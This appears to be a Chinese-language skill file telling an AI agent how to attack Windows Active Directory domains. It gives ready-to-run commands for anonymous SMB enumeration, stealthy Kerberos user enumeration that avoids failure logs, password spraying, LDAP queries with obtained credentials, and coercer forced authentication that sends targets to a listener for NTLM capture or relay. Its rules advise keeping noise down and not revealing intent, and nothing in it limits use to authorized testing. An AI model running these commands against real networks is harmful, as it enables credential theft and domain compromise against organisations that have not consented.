---
name: ad-kerberos
description: 面对 Windows 域/Active Directory 环境时使用：netexec 做 SMB/LDAP/WinRM 枚举与凭据验证、kerbrute 做 Kerberos 用户枚举与喷洒、 bloodyAD 做 LDAP 对象操作、coercer 强制认证、enum4linux-ng 快速盘点；出现 88/389/445/5985 端口或域名信息时优先想到它
---

## 用法

* 先匿名/空会话枚举，再用手头凭据逐层扩大；krb5-user 已装好，`kinit` 可直接用
* 所有工具输出用 `tee` 或重定向落盘到 `ad/` 目录
* impacket 系列脚本（kali 元包）可按需补充，如 GetUserSPNs.py、secretsdump.py

SMB 匿名枚举（空会话看共享与域信息）：

```bash
mkdir -p ad && netexec smb 10.0.0.10 -u '' -p '' --shares | tee ad/nxc-smb-anon.txt
```

Kerberos 用户枚举（不触发 4625 登录失败日志，相对隐蔽）：

```bash
kerbrute userenum --dc 10.0.0.10 -d corp.local users.txt -o ad/kerbrute-users.txt
```

口令喷洒（每个口令全量用户试一轮，间隔执行防锁定）：

```bash
netexec smb 10.0.0.10 -u ad/valid-users.txt -p 'Password123' --continue-on-success | tee ad/nxc-spray-1.txt
```

拿到凭据后做 LDAP 查询（bloodyAD）：

```bash
bloodyAD --host 10.0.0.10 -d corp.local -u user1 -p 'Password123' get search --filter '(objectClass=user)' --attr sAMAccountName,memberOf | tee ad/bloodyad-users.txt
```

强制目标回连认证（配合 Responder/ntlmrelayx 捕获或中继）：

```bash
coercer coerce -l 10.0.0.99 -t 10.0.0.20 -u user1 -p 'Password123' -d corp.local | tee ad/coercer.txt
```

enum4linux-ng 一把梭（SMB 全项枚举，YAML 落盘）：

```bash
enum4linux-ng -A 10.0.0.10 -oY ad/enum4linux
```

## 规则

- 口令喷洒前先确认域锁定策略（`netexec smb <dc> -u <user> -p <pass> --pass-pol`），每轮口令之间留出时间间隔，宁慢勿锁
- 同一种凭据验证失败两次就停用该组合，不要盲目重试放大噪声
- 每个阶段（枚举→喷洒→凭据利用）的结果先落盘再进入下一阶段，凭据清单统一维护在 `ad/` 下
- coercer 这类强制认证动作会先和 Responder/ntlmrelayx 之类的监听配合好再打，避免白打一次暴露意图
- Kerberos 操作注意时钟同步（`sudo ntpdate <dc>` 或 `sudo timedatectl`），时钟偏差会导致 kinit/kerbrute 莫名失败
